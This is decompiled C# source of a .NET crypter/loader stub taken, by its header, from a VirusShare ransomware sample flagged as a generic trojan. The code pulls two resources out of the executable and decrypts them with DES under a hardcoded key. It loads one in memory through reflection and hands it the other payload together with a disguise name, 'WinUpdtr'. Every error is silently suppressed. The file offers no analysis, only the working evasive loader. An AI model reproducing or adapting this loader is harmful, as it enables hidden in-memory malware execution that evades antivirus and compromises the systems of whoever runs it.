// Decompiled with JetBrains decompiler
// Type: MyModuleCrm
// Assembly: crypted DC server, Version=4.3.5.1, Culture=neutral, PublicKeyToken=null
// MVID: C302CB7E-0B52-4CC6-8F8A-DD2CAEFCE137
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Trojan.Win32.Generic-7467389d865089caa1830efa45ba37ff408f723dd0debf0e94d3fe4376aa1408.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Reflection;
using System.Resources;
using System.Security.Cryptography;
using System.Text;

[StandardModule]
internal sealed class MyModuleCrm
{
  private static string ResRead1;
  private static string ResRead2;
  private static byte[] ResDec1;
  private static byte[] ResDec2;

  [STAThread]
  public static void Main()
  {
    try
    {
      MyModuleCrm.ReadMyRes();
      MyModuleCrm.ResDecrpy();
      MyModuleCrm.ExecuteBytes();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }

  private static void ReadMyRes()
  {
    ResourceManager resourceManager = new ResourceManager("kyiQuUpTrmlxYb", Assembly.GetExecutingAssembly());
    MyModuleCrm.ResRead1 = (string) resourceManager.GetObject("lyTLGfUDZmrKvn");
    MyModuleCrm.ResRead2 = (string) resourceManager.GetObject("BfeKZresLttuPL");
  }

  private static void ResDecrpy()
  {
    MyModuleCrm.ResDec1 = MyModuleCrm.CustEncDec(Convert.FromBase64String(MyModuleCrm.ResRead1), "lAjAapAj");
    MyModuleCrm.ResDec2 = MyModuleCrm.CustEncDec(Convert.FromBase64String(MyModuleCrm.ResRead2), "lAjAapAj");
  }

  private static void ExecuteBytes()
  {
    string str = Convert.ToBase64String(MyModuleCrm.ResDec1) + "||SPLIT||FALSE||SPLIT||" + Assembly.GetExecutingAssembly().Location + "||SPLIT||WinUpdtr||SPLIT||";
    Assembly.Load(MyModuleCrm.ResDec2).GetType("Chromev3.Chrmv3").GetMethods()[0].Invoke((object) null, new object[2]
    {
      (object) str,
      (object) true
    });
  }

  public static byte[] CustEncDec(byte[] bytes, string Key)
  {
    byte[] inputBuffer = bytes;
    DESCryptoServiceProvider cryptoServiceProvider = new DESCryptoServiceProvider();
    cryptoServiceProvider.Key = Encoding.UTF8.GetBytes(Key);
    cryptoServiceProvider.Mode = CipherMode.ECB;
    cryptoServiceProvider.Padding = PaddingMode.PKCS7;
    byte[] numArray = cryptoServiceProvider.CreateDecryptor().TransformFinalBlock(inputBuffer, 0, inputBuffer.Length);
    cryptoServiceProvider.Clear();
    return numArray;
  }
}
